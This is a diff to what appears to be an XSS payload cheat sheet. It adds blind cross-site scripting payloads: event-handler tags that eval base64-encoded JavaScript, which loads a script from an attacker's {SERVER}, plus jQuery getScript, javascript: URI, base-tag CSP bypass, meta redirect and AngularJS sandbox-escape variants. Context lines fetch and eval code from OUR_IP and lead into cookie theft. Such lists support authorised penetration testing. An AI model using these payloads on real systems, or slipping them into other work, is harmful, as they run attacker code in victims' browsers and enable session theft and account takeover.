@@ -27,6 +27,34 @@
 javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
 <script>$.getScript("http://OUR_IP")</script>
+
+'"><svg onload="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">
+
+# More Advanced Payloads
+<!-- Image tag -->
+'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">
+
+<!-- Input tag with autofocus -->
+'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">
+
+<!-- In case jQuery is loaded, we can make use of the getScript method -->
+'"><script>$.getScript("{SERVER}/script.js")</script>
+
+<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
+javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))
+
+<!-- Render an iframe to validate your injection point and receive a callback -->
+'"><iframe src="{SERVER}"></iframe>
+
+<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
+<base href="{SERVER}" />
+
+<!-- Make use of the meta-tag to initiate a redirect -->
+<meta http-equiv="refresh" content="0; url={SERVER}" />
+
+<!-- In case your target makes use of AngularJS -->
+{{constructor.constructor("import('{SERVER}/script.js')")()}}
+
 ```
 
 - Grab the cookies:
